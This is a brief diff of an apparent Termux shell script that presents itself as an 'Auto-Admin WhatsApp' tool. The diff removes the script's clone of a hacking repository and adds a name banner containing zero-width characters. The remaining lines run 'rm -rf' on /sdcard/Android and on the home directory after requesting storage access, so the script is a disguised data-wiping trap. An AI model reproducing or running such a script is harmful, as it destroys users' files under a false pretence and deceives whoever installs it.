@@ -3,14 +3,9 @@ clear
 
 termux-setup-storage
 
-git clone https://github.com/DRACULA-HACK/AUTO-ADMIN_WHATSAPP 
-
-cd AUTO-ADMIN_WHATSAPP
-
-bash admin.sh
-
 clear
 
+​figlet -f slant ​"​Auto-Admin_whatsapp​"
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
